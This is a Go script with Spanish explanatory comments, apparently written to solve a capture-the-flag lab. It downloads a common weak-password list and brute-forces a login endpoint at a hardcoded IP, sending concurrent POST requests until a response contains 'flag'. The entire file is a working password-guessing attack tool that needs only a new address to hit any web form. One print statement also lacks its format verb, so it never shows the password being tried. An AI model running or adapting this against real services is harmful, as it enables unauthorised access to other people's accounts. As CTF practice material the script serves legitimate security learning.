package main

// imports
import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
)

// Variables globales
var ip = "94.237.50.221" // Cambia esta IP por la dirección de tu servidor
var port = 46506      // Cambia este puerto por el de tu servidor

// Función para intentar una contraseña
// Parametros explicados:
// password: cadena de caracteres
// wg: un puntero a un WaitGroup, que se utiliza para esperar a que todas las goroutines terminen.
// done: un canal que se cierra cuando se encuentra la contraseña correcta.
func tryPassword(password string, wg *sync.WaitGroup, done chan bool) {
	defer wg.Done() // Marca la goroutine como terminada

	// Crear el cuerpo del POST con el password
	data := fmt.Sprintf("password=%s", password) // asigno el password en formato de cadena de caracteres
	// %s es un marcador de posición para una cadena de caracteres al estilo de C
	// response, error es una función que devuelve dos valores, el primero es la respuesta y el segundo es un error al estilo de node js req, res
	resp, err := http.Post(fmt.Sprintf("http://%s:%d/dictionary", ip, port), "application/x-www-form-urlencoded", bytes.NewBufferString(data))
	// %d es un marcador de posición para un número entero al estilo de C
	fmt.Printf("Probando \n", password) // Agrega una impresión para mostrar la contraseña que se está probando
	if err != nil {
		// Si hay un error, salir de la goroutine
		fmt.Println("Error al intentar la contraseña:", err)
		return
	}
	defer resp.Body.Close()

	// Leer la respuesta del servidor
	body, _ := ioutil.ReadAll(resp.Body)

	// Verificar si la respuesta contiene el flag
	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "flag") {
		fmt.Printf("¡Contraseña correcta encontrada!: %s\n", password)
		fmt.Printf("Flag: %s\n", string(body))
		close(done) // Detener todas las goroutines
	}
}

func main() {
	// Descargar la lista de contraseñas
	fmt.Println("Descargando lista de contraseñas...")
	resp, err := http.Get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt")
	if err != nil {
		fmt.Println("Error al descargar la lista de contraseñas:", err)
		return
	}
	defer resp.Body.Close() // Cerrar el cuerpo de la respuesta

	// Leer y dividir las contraseñas
	body, _ := ioutil.ReadAll(resp.Body)
	// las variables body y _ son variables que se utilizan para ignorar valores que no se necesitan, en este caso el error.
	passwords := strings.Split(string(body), "\n")
	// Split es una función que divide una cadena en subcadenas utilizando un separador y devuelve un slice de subcadenas.
	// Inicializar WaitGroup y canal done
	var wg sync.WaitGroup // WaitGroup es una estructura que se utiliza para esperar a que varias goroutines
	done := make(chan bool) // Make en go se utiliza para crear un canal, slice o mapa. En este caso nos sirve para crear un canal de tipo booleano.

	// Probar cada contraseña en paralelo
	for _, password := range passwords {
		select {
		case <-done:
			// Si el canal done se cierra, salir del ciclo
			return
		default:
			// Agregar una goroutine al WaitGroup
			wg.Add(1)
			go tryPassword(password, &wg, done)
		}
	}

	// Esperar a que todas las goroutines terminen
	wg.Wait()
}
